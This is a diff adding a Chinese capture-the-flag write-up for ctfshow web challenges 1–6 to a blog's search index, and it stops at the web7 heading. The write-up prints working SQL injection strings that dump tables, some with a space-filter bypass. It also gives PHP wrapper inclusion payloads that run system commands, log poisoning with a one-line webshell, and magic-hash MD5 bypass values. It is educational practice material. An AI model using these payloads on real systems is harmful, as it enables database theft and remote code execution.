@@ -9245,4 +9245,116 @@
         <tag>信息搜集</tag>
       </tags>
   </entry>
+  <entry>
+    <title>ctfshow之web专题</title>
+    <url>/2024/12/04/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/</url>
+    <content><![CDATA[<h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>因为这里的题有些也是比较简单的，所以这里的知识点和做法不会讲述特别多，不会的可以直接看其他文章的题目有写的很详细的</p>
+<h1 id="0x02题目"><a href="#0x02题目" class="headerlink" title="0x02题目"></a>0x02题目</h1><h2 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h2><p>查看源代码然后拿去进行base64编码就可以拿到flag了</p>
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>最简单的sql注入</p>
+<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204212546700.png" alt="image-20241204212546700"></p>
+<p>进来是一个，页面源代码也没什么可用的信息，那我们就测试一下</p>
+<p>先用永真语句打一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27; or &#x27;1&#x27; =&#x27;1&#x27;--+&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204214741542.png" alt="image-20241204214741542"></p>
+<p>可以看到登录成功了，那我们就拿ctfshow作为账号去打一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断字段数</span><br><span class="line">password=1&amp;username=ctfshow&#x27; order by 3--+回显成功</span><br><span class="line">password=1&amp;username=ctfshow&#x27; order by 4--+回显失败</span><br><span class="line">证明是三个字段</span><br><span class="line">判断回显位置</span><br><span class="line">password=1&amp;username=ctfshow&#x27; union select 1,2,3--+发现2出现在了页面中，那我们用2作为回显位置去注入</span><br><span class="line">爆破数据库</span><br><span class="line">password=1&amp;username=ctfshow&#x27; union select 1,database(),3--+数据库名为web2</span><br><span class="line">爆破表名</span><br><span class="line">password=1&amp;username=ctfshow&#x27; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;web2&#x27;),3--+有flag和user两个表</span><br><span class="line">爆破flag表中字段</span><br><span class="line">password=1&amp;username=ctfshow&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;flag&#x27;),3--+</span><br><span class="line">爆破字段中数据</span><br><span class="line">password=1&amp;username=ctfshow&#x27; union select 1,(select flag from web2.flag),3--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204215434905.png" alt="image-20241204215434905"></p>
+<p>成功拿到flag！</p>
+<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>更简单的web题</p>
+<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204215643879.png" alt="image-20241204215643879"></p>
+<p>include文件包含</p>
+<p>直接用伪协议做试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>但是没什么，应该是文件名不对</p>
+<p>那我们用data伪协议去做</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain,&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204220259354.png" alt="image-20241204220259354"></p>
+<p>读取文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain,&lt;?php system(&#x27;tac ctf_go_go_go&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到flag</p>
+<p>这里也可以用input伪协议去做，url传入php:&#x2F;&#x2F;input，然后抓包用post传入命令或一句话木马</p>
+<p>或者也可以用日志注入，方法有很多，就不赘述了</p>
+<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204220645090.png" alt="image-20241204220645090"></p>
+<p>和上一题一样的页面，我们先测试一下刚刚的方法能不能做</p>
+<p>好吧页面没反应，应该是过滤了，我们试试input，发现出现了error</p>
+<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204221123622.png" alt="image-20241204221123622"></p>
+<p>那就试一下日志注入吧</p>
+<p>先看一下服务器的版本</p>
+<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204221222472.png" alt="image-20241204221222472"></p>
+<p>是nginx，那就访问nginx下的access.log，url传参</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204221258839.png" alt="image-20241204221258839"></p>
+<p>在UA头传入一句话木马</p>
+<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204221511113.png" alt="image-20241204221511113"></p>
+<p>然后访问并用蚁剑连接</p>
+<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204221552019.png" alt="image-20241204221552019"></p>
+<p>然后在里面找flag就可以了</p>
+<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf.show_web5</span><br><span class="line">where is flag?</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_web5&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_web5&lt;/h2&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;h3&gt;</span><br><span class="line">    &lt;/center&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        $flag=&quot;&quot;;</span><br><span class="line">        $v1=$_GET[&#x27;v1&#x27;];</span><br><span class="line">        $v2=$_GET[&#x27;v2&#x27;];</span><br><span class="line">        if(isset($v1) &amp;&amp; isset($v2))&#123;</span><br><span class="line">            if(!ctype_alpha($v1))&#123;</span><br><span class="line">                die(&quot;v1 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(!is_numeric($v2))&#123;</span><br><span class="line">                die(&quot;v2 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(md5($v1)==md5($v2))&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">        </span><br><span class="line">            echo &quot;where is flag?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们只看里面的php代码就行了</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">        <span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$v1</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;v1 error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;v2 error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;where is flag?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码分析：</p>
+<h3 id="ctype-alpha-v1"><a href="#ctype-alpha-v1" class="headerlink" title="ctype_alpha($v1)"></a><code>ctype_alpha($v1)</code></h3><p>在PHP中，<code>ctype_alpha($v1)</code> 函数用于检查字符串 <code>$v1</code> 是否只包含字母字符。如果字符串中的所有字符都是字母（A-Z和a-z），则函数返回 <code>true</code>，否则返回 <code>false</code>。</p>
+<h3 id="is-numeric-v2"><a href="#is-numeric-v2" class="headerlink" title="is_numeric($v2)"></a>is_numeric($v2)</h3><p>在 PHP 中，<code>is_numeric($v2)</code> 函数用于检查变量 <code>$v2</code> 的值是否为一个数字或数字字符串。如果 <code>$v2</code> 是一个数字，包括整数或浮点数，或者是表示数字的字符串（比如 <code>&quot;123&quot;</code> 或 <code>&quot;3.14&quot;</code>），则函数返回 <code>true</code>；否则返回 <code>false</code>。</p>
+<p>这里的话就是绕过md5验证，要求v1为为字母，v2为数字，并且v1与v2的md5值相同。<br>PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0<br>所以只要v1与v2的md5值以0E开头即可。</p>
+<p>v1&#x3D;QNKCDZO&amp;v2&#x3D;240610708</p>
+<p>这两个的md5值都是0e开头，所以他们的md5值相等</p>
+<h3 id="开头为0E（MD5值碰撞）"><a href="#开头为0E（MD5值碰撞）" class="headerlink" title="开头为0E（MD5值碰撞）"></a>开头为0E（MD5值碰撞）</h3><p>字母数字混合类型：</p>
+<p>s878926199a</p>
+<p>0e545993274517709034328855841020</p>
+<p>s155964671a</p>
+<p>0e342768416822451524974117254469</p>
+<p>s214587387a</p>
+<p>0e848240448830537924465865611904</p>
+<p>s214587387a</p>
+<p>0e848240448830537924465865611904</p>
+<p>纯大写字母：</p>
+<p>QLTHNDT</p>
+<p>0e405967825401955372549139051580</p>
+<p>QNKCDZO</p>
+<p>0e830400451993494058024219903391</p>
+<p>EEIZDOI</p>
+<p>0e782601363539291779881938479162</p>
+<p>纯数字：</p>
+<p>240610708</p>
+<p>0e462097431906509019562988736854</p>
+<p>4011627063<br>0e485805687034439905938362701775</p>
+<p>4775635065<br>0e998212089946640967599450361168</p>
+<p>4790555361<br>0e643442214660994430134492464512  </p>
+<p>5432453531<br>0e512318699085881630861890526097</p>
+<p>5579679820<br>0e877622011730221803461740184915 </p>
+<p>5585393579<br>0e664357355382305805992765337023</p>
+<p>6376552501<br>0e165886706997482187870215578015  </p>
+<p>7124129977<br>0e500007361044747804682122060876<br>7197546197<br>0e915188576072469101457315675502</p>
+<p>7656486157      </p>
+<p>0e451569119711843337267091732412</p>
+<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204222916746.png" alt="image-20241204222916746"></p>
+<p>是跟前面一样的登录界面</p>
+<p>测试一下发现好像有过滤</p>
+<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204223406033.png" alt="image-20241204223406033"></p>
+<p>出现一个sql注入错误，看看过滤了什么</p>
+<p>测试后发现过滤了空格，用内联注释绕过</p>
+<p>然后发现过滤了–+注释符号，我们换成#</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27;/**/or/**/&#x27;1&#x27;=&#x27;1&#x27;#&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204224151511.png" alt="image-20241204224151511"></p>
+<p>这下可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断字段数</span><br><span class="line">username=ctfshow&#x27;/**/order/**/by/**/3#&amp;password=1字段数为3</span><br><span class="line">判断回显位置</span><br><span class="line">username=ctfshow&#x27;/**/union/**/select/**/1,2,3#&amp;password=1还是一样2出现回显</span><br><span class="line">爆破数据库</span><br><span class="line">username=ctfshow&#x27;/**/union/**/select/**/1,database(),3#&amp;password=1数据库为web2</span><br><span class="line">爆破表名</span><br><span class="line">username=ctfshow&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;web2&#x27;),3#&amp;password=1出现flag和user表</span><br><span class="line">查询flag表下字段</span><br><span class="line">username=ctfshow&#x27;/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;),3#&amp;password=1出现flag字段</span><br><span class="line">爆flag数据</span><br><span class="line">username=ctfshow&#x27;/**/union/**/select/**/1,(select/**/flag/**/from/**/web2.flag),3#&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到flag</p>
+<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2>]]></content>
+      <categories>
+        <category>ctfshow</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
 </search>
